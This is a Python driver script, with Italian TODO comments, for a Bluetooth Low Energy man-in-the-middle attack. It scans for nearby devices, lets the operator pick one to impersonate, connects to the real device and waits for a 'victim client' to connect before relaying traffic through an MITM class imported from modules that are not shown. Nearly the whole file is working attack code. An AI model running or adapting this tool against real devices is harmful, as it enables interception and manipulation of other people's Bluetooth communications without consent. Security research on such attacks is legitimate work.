"""
TODO:
- inserire mitm-interactive e sav su pcap
- dividere meglio in moduli (magari togliere da utility tutta la roba che riguarda i pacchetti
e mettere in un modulo separato)
- commentare assolutamente tutto
- aggiungere più roba in decode
"""


from scapy.layers.bluetooth import *
import select
from os import system
from time import sleep
from utility import *
from scan import *
from forward import *

SCANNING_DURATION = 3
CLIENT_CONNECTION_TIMEOUT = 15

if __name__ == '__main__':

    system('hciconfig hci0 down; hciconfig hci1 down')

    try:
        server = BluetoothUserSocket(0)
        print('[OK] Server socket created')
        client = BluetoothUserSocket(1)
        print('[OK] Client socket created')
    except Exception as e:
        print(e)
        exit()
    
    try:
        print('Starting scanning process')
        start_scanning(client)
        sleep(SCANNING_DURATION)
        stop_scanning(client)
        print('[OK] Starting scanning completed')
    except Exception as e:
        print(e)
        exit()
    
    scanned_devices = collect_scanning_result(client)
    show_scanning_result(scanned_devices)

    selected_device_idx = input("Select device to emulate: ")
    scanned_devices_list = list(scanned_devices.items())
    victim_server = scanned_devices_list[int(selected_device_idx)]

    try:
        enable_emulation(client, victim_server[1])
        print(f'[OK] Client socket started to emulate victim server ({victim_server[0]})')
        server_handle = victim_server_connect(server, victim_server[0])
        print(f'[OK] Server socket connected to victim server ({victim_server[0]})')
        print(f'[OK] Server handle found: {server_handle}')
    except Exception as e:
        print(e)
        exit()

    attack = MITM(client, server, server_handle, victim_server[0])

    print('Starting the attack, now waiting for victim client...')
    if attack.capture_client(CLIENT_CONNECTION_TIMEOUT):
        print(f'[OK] Victim client connected:\n - Handle: {attack.client_handle}\n - Address: {attack.client_paddr}')
    else:
        print("Timeout elapsed, no victim client found")
        exit()
    
    attack.run(CLIENT_CONNECTION_TIMEOUT)
    
    
    